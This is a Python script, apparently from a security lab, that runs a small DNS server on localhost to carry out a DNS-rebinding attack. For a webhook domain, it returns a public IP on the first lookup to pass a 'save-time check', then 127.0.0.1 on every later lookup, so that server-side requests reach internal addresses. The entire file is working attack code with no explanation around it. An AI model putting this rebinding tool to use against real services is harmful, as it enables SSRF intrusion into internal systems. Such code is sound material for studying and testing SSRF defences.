import socket
import struct

LISTEN_PORT = 5053
DOMAIN = "hooks.notifyservice.lab"
PUBLIC_IP = "203.0.113.55"  
INTERNAL_IP = "127.0.0.1"

query_counts = {}


def parse_qname(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        offset += 1
        labels.append(data[offset:offset + length].decode(errors="ignore"))
        offset += length
    return ".".join(labels), offset


def build_response(txid, qname_raw, ip):
    flags = 0x8180 
    header = struct.pack(">HHHHHH", txid, flags, 1, 1, 0, 0)

    question = qname_raw  

    name_ptr = struct.pack(">H", 0xC00C)  
    rtype = struct.pack(">H", 1)      
    rclass = struct.pack(">H", 1)     
    ttl = struct.pack(">I", 0)           
    rdlength = struct.pack(">H", 4)
    rdata = socket.inet_aton(ip)

    answer = name_ptr + rtype + rclass + ttl + rdlength + rdata
    return header + question + answer


def handle_query(data):
    txid = struct.unpack(">H", data[0:2])[0]
    qname, after_name = parse_qname(data, 12)
    qname_raw = data[12:after_name + 4] 

    key = qname.lower()
    query_counts[key] = query_counts.get(key, 0) + 1
    n = query_counts[key]

    if key == DOMAIN:
        ip = PUBLIC_IP if n == 1 else INTERNAL_IP
        print(f"[DNS] query #{n} for {qname} -> {ip} "
              f"({'public, save-time check' if n == 1 else 'internal, rebind!'})")
    else:
        ip = "127.0.0.1"
        print(f"[DNS] query for unknown domain {qname} -> default {ip}")

    return build_response(txid, qname_raw, ip)


if __name__ == "__main__":
    print(f"[*] rebind_dns.py listening on 127.0.0.1:{LISTEN_PORT}/UDP")
    print(f"    -> first query for {DOMAIN} returns {PUBLIC_IP}, every later query -> {INTERNAL_IP}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", LISTEN_PORT))
    while True:
        data, addr = sock.recvfrom(512)
        try:
            response = handle_query(data)
            sock.sendto(response, addr)
        except Exception as e:
            print(f"[DNS] error: {e}")
